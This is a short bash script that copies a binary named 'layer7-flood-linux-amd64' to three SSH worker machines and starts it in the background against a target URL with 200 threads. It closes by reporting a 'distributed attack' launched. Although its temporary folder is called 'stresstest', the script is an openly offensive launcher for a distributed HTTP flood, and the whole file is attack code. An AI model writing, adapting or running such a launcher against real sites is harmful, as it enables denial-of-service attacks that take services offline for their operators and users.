#!/bin/bash
# scripts/distributed.sh

# Distributed mode - launch on multiple machines via SSH
HOSTS=(
    "worker1@192.168.1.101"
    "worker2@192.168.1.102"
    "worker3@192.168.1.103"
)

TARGET=${1:-"http://target.com"}
DURATION=${2:-60}

for HOST in "${HOSTS[@]}"; do
    echo "[+] Deploying to $HOST"
    ssh "$HOST" "mkdir -p /tmp/stresstest"
    scp bin/layer7-flood-linux-amd64 "$HOST:/tmp/stresstest/stress"
    ssh "$HOST" "nohup /tmp/stresstest/stress -target $TARGET -duration $DURATION -threads 200 > /dev/null 2>&1 &"
done

echo "[+] Distributed attack launched on ${#HOSTS[@]} workers"
